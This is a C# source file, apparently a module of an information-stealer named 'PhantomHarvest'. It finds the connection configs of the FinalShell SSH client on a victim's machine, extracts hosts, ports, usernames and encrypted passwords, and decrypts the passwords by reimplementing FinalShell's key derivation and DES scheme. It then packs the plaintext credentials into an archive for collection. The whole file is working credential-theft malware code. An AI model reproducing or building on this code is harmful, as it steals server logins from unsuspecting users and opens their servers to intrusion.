using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using PhantomHarvest.Helper;

namespace PhantomHarvest.Tools
{
	internal class FinalShell
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string info = FinalShell.GetInfo();
				if (!string.IsNullOrEmpty(info))
				{
					using (MemoryStream ms = new MemoryStream(Encoding.UTF8.GetBytes(info)))
					{
						zip.AddStream(ArchiveManager.Compression.Deflate, FinalShell.ToolName + "/FinalShell.txt", ms, DateTime.Now, "");
					}
				}
			}
			catch
			{
			}
		}

		public static string GetInfo()
		{
			StringBuilder stringBuilder = new StringBuilder();
			string path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\finalshell\\conn";
			if (!Directory.Exists(path)) return "";

			foreach (string text in Directory.GetFiles(path))
			{
				if (text.EndsWith("_connect_config.json"))
				{
					string input;
					try
					{
						byte[] bytes = LockedFile.ReadLockedFile(text);
						input = bytes != null ? Encoding.UTF8.GetString(bytes) : File.ReadAllText(text);
					}
					catch { continue; }

					string str = "";
					string data = "";
					string str2 = "";
					string str3 = "";
					MatchCollection matchCollection = new Regex("\"user_name\":\"(.*?)\"", RegexOptions.Compiled).Matches(input);
					MatchCollection matchCollection2 = new Regex("\"password\":\"(.*?)\"", RegexOptions.Compiled).Matches(input);
					MatchCollection matchCollection3 = new Regex("\"host\":\"(.*?)\"", RegexOptions.Compiled).Matches(input);
					MatchCollection matchCollection4 = new Regex("\"port\":(.*?),", RegexOptions.Compiled).Matches(input);
					foreach (object obj in matchCollection)
					{
						Match match = (Match)obj;
						if (match.Success)
						{
							str = match.Groups[1].Value;
						}
					}
					foreach (object obj2 in matchCollection2)
					{
						Match match2 = (Match)obj2;
						if (match2.Success)
						{
							data = match2.Groups[1].Value;
						}
					}
					foreach (object obj3 in matchCollection3)
					{
						Match match3 = (Match)obj3;
						if (match3.Success)
						{
							str2 = match3.Groups[1].Value;
						}
					}
					foreach (object obj4 in matchCollection4)
					{
						Match match4 = (Match)obj4;
						if (match4.Success)
						{
							str3 = match4.Groups[1].Value;
						}
					}
					stringBuilder.AppendLine("host: " + str2);
					stringBuilder.AppendLine("port: " + str3);
					stringBuilder.AppendLine("user_name: " + str);
					stringBuilder.AppendLine("password: " + FinalShell.decodePass(data));
					stringBuilder.AppendLine();
				}
			}
			return stringBuilder.ToString();
		}

		public static byte[] desDecode(byte[] data, byte[] head)
		{
			byte[] iv = new byte[8];
			byte[] array = new byte[8];
			Array.Copy(head, array, 8);
			DESCryptoServiceProvider descryptoServiceProvider = new DESCryptoServiceProvider();
			descryptoServiceProvider.Key = array;
			descryptoServiceProvider.IV = iv;
			descryptoServiceProvider.Padding = PaddingMode.PKCS7;
			descryptoServiceProvider.Mode = CipherMode.ECB;
			MemoryStream memoryStream = new MemoryStream();
			CryptoStream cryptoStream = new CryptoStream(memoryStream, descryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
			cryptoStream.Write(data, 0, data.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}

		public static string decodePass(string data)
		{
			if (data == null)
			{
				return null;
			}
			byte[] array = Convert.FromBase64String(data);
			byte[] array2 = new byte[8];
			Array.Copy(array, 0, array2, 0, array2.Length);
			byte[] array3 = new byte[array.Length - array2.Length];
			Array.Copy(array, array2.Length, array3, 0, array3.Length);
			byte[] head = FinalShell.ranDomKey(array2);
			byte[] bytes = FinalShell.desDecode(array3, head);
			return Encoding.ASCII.GetString(bytes);
		}

		private static byte[] ranDomKey(byte[] head)
		{
			JavaRng javaRng = new JavaRng(3680984568597093857L / (long)new JavaRng((long)((ulong)head[5])).nextInt(127));
			int num = (int)head[0];
			for (int i = 0; i < num; i++)
			{
				javaRng.nextLong();
			}
			JavaRng javaRng2 = new JavaRng(javaRng.nextLong());
			long[] array = new long[]
			{
				(long)((ulong)head[4]),
				javaRng2.nextLong(),
				(long)((ulong)head[7]),
				(long)((ulong)head[3]),
				javaRng2.nextLong(),
				(long)((ulong)head[1]),
				javaRng.nextLong(),
				(long)((ulong)head[2])
			};
			byte[] result;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
				{
					long[] array2 = array;
					int num2 = array.Length;
					for (int j = 0; j < num2; j++)
					{
						long num3 = array2[j];
						try
						{
							binaryWriter.Write(new byte[]
							{
								(byte)(num3 >> 56),
								(byte)(num3 >> 48),
								(byte)(num3 >> 40),
								(byte)(num3 >> 32),
								(byte)(num3 >> 24),
								(byte)(num3 >> 16),
								(byte)(num3 >> 8),
								(byte)num3
							});
						}
						catch
						{
							return null;
						}
					}
					result = FinalShell.md5(memoryStream.ToArray());
				}
			}
			return result;
		}

		public static byte[] md5(byte[] data)
		{
			byte[] result;
			try
			{
				result = MD5.Create().ComputeHash(data);
			}
			catch
			{
				result = null;
			}
			return result;
		}

		public static string ToolName = "FinalShell";
	}
}
